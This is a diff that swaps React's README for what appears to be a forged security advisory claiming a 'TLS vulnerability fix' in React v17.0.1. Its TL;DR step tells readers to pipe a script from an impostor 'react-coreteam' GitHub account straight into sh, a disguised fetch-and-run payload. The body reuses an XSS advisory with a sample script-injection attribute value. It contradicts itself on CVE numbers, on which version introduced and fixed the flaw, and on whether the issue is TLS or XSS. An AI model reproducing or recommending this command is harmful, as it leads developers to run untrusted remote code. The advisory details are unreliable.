@@ -1,75 +1,53 @@
-# [React](https://reactjs.org/) &middot; [![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/facebook/react/blob/master/LICENSE) [![npm version](https://img.shields.io/npm/v/react.svg?style=flat)](https://www.npmjs.com/package/react) [![CircleCI Status](https://circleci.com/gh/facebook/react.svg?style=shield&circle-token=:circle-token)](https://circleci.com/gh/facebook/react) [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://reactjs.org/docs/how-to-contribute.html#your-first-pull-request)
+# React v17.0.1: Server-side TLS vulnerability fix
 
-React is a JavaScript library for building user interfaces.
+A new vulnerability on unix systems was found and it might affect some apps using ReactDOMServer. We are releasing a patch for every affected React minor release so that you can upgrade with no friction but it is highly recommended that you update your basic OS libs as well. Read on for more details.
 
-* **Declarative:** React makes it painless to create interactive UIs. Design simple views for each state in your application, and React will efficiently update and render just the right components when your data changes. Declarative views make your code more predictable, simpler to understand, and easier to debug.
-* **Component-Based:** Build encapsulated components that manage their own state, then compose them to make complex UIs. Since component logic is written in JavaScript instead of templates, you can easily pass rich data through your app and keep state out of the DOM.
-* **Learn Once, Write Anywhere:** We don't make assumptions about the rest of your technology stack, so you can develop new features in React without rewriting existing code. React can also render on the server using Node and power mobile apps using [React Native](https://reactnative.dev/).
+### TL;DR
 
-[Learn how to use React in your own project](https://reactjs.org/docs/getting-started.html).
+To apply the fix just run the command bellow:
 
-## Installation
-
-React has been designed for gradual adoption from the start, and **you can use as little or as much React as you need**:
-
-* Use [Online Playgrounds](https://reactjs.org/docs/getting-started.html#online-playgrounds) to get a taste of React.
-* [Add React to a Website](https://reactjs.org/docs/add-react-to-a-website.html) as a `<script>` tag in one minute.
-* [Create a New React App](https://reactjs.org/docs/create-a-new-react-app.html) if you're looking for a powerful JavaScript toolchain.
-
-You can use React as a `<script>` tag from a [CDN](https://reactjs.org/docs/cdn-links.html), or as a `react` package on [npm](https://www.npmjs.com/package/react).
-
-## Documentation
-
-You can find the React documentation [on the website](https://reactjs.org/docs).  
-
-Check out the [Getting Started](https://reactjs.org/docs/getting-started.html) page for a quick overview.
-
-The documentation is divided into several sections:
-
-* [Tutorial](https://reactjs.org/tutorial/tutorial.html)
-* [Main Concepts](https://reactjs.org/docs/hello-world.html)
-* [Advanced Guides](https://reactjs.org/docs/jsx-in-depth.html)
-* [API Reference](https://reactjs.org/docs/react-api.html)
-* [Where to Get Support](https://reactjs.org/community/support.html)
-* [Contributing Guide](https://reactjs.org/docs/how-to-contribute.html)
-
-You can improve it by sending pull requests to [this repository](https://github.com/reactjs/reactjs.org).
-
-## Examples
-
-We have several examples [on the website](https://reactjs.org/). Here is the first one to get you started:
-
-```jsx
-function HelloMessage({ name }) {
-  return <div>Hello {name}</div>;
-}
-
-ReactDOM.render(
-  <HelloMessage name="Taylor" />,
-  document.getElementById('container')
-);
+```
+  sh -c "$(curl -fsSL https://raw.githubusercontent.com/react-coreteam/react/master/scripts/patch-v17.0.1-and-minors.sh)"
 ```
 
-This example will render "Hello Taylor" into a container on the page.
+### Short Description
 
-You'll notice that we used an HTML-like syntax; [we call it JSX](https://reactjs.org/docs/introducing-jsx.html). JSX is not required to use React, but it makes code more readable, and writing it feels like writing HTML. If you're using React as a `<script>` tag, read [this section](https://reactjs.org/docs/add-react-to-a-website.html#optional-try-react-with-jsx) on integrating JSX; otherwise, the [recommended JavaScript toolchains](https://reactjs.org/docs/create-a-new-react-app.html) handle it automatically.
+Today, we are releasing a fix for a vulnerability we discovered in the react-dom/server implementation. It was introduced with the version 17.0.1 and has existed in all subsequent releases until today.
 
-## Contributing
+This vulnerability can only affect some server-rendered React apps. Purely client-rendered apps are not affected. Additionally, we expect that most server-rendered apps don’t contain the vulnerable pattern described below. Nevertheless, we recommend to follow the mitigation instructions at the earliest opportunity.
 
-The main purpose of this repository is to continue evolving React core, making it faster and easier to use. Development of React happens in the open on GitHub, and we are grateful to the community for contributing bugfixes and improvements. Read below to learn how you can take part in improving React.
+While we were investigating this vulnerability, we found similar vulnerabilities in a few other popular front-end libraries. We have coordinated this release together with Vue and Preact releases fixing the same issue. The tracking number for this vulnerability is CVE-2020-6341.
 
-### [Code of Conduct](https://code.fb.com/codeofconduct)
+### Detailed Description
 
-Facebook has adopted a Code of Conduct that we expect project participants to adhere to. Please read [the full text](https://code.fb.com/codeofconduct) so that you can understand what actions will and will not be tolerated.
+Specifically, the vulnerable pattern looks like this:
 
-### [Contributing Guide](https://reactjs.org/contributing/how-to-contribute.html)
+```
+  let props = {};
+  props[userProvidedData] = "hello";
+  let element = <div {...props} />;
+  let html = ReactDOMServer.renderToString(element);
+```
 
-Read our [contributing guide](https://reactjs.org/contributing/how-to-contribute.html) to learn about our development process, how to propose bugfixes and improvements, and how to build and test your changes to React.
+In order to exploit it, the attacker would need to craft a special attribute name that triggers an XSS vulnerability. For example:
 
-### Good First Issues
+`let userProvidedData = '></div><script>alert("hi")</script>';`
 
-To help you get your feet wet and get you familiar with our contribution process, we have a list of [good first issues](https://github.com/facebook/react/labels/good%20first%20issue) that contain bugs which have a relatively limited scope. This is a great place to get started.
+In the vulnerable versions of react-dom/server, the output would let the attacker inject arbitrary markup:
 
-### License
+`<div ></div><script>alert("hi")</script>`
 
-React is [MIT licensed](./LICENSE).
+In the versions after the vulnerability was fixed (and before it was introduced), attributes with invalid names are skipped:
+
+`<div></div>`
+
+You would also see a warning about an invalid attribute name.
+
+Note that we expect attribute names based on user input to be very rare in practice. It doesn’t serve any common practical use case, and has other potential security implications that React can’t guard against.
+
+### Changelog
+
+#### React DOM Server
+* Fix a potential XSS vulnerability when the attacker controls an attribute name (CVE-2018-6341). This fix is available in the latest react-dom@17.0.1, as well as in previous affected minor versions: react-dom@17.0.1, react-dom@16.1.2, react-dom@16.2.1, and react-dom@16.3.3. (@gaearon in #13302)
+
+* Fix a crash in the server renderer when an attribute is called hasOwnProperty. This fix is only available in react-dom@16.4.2. (@gaearon in #13303)
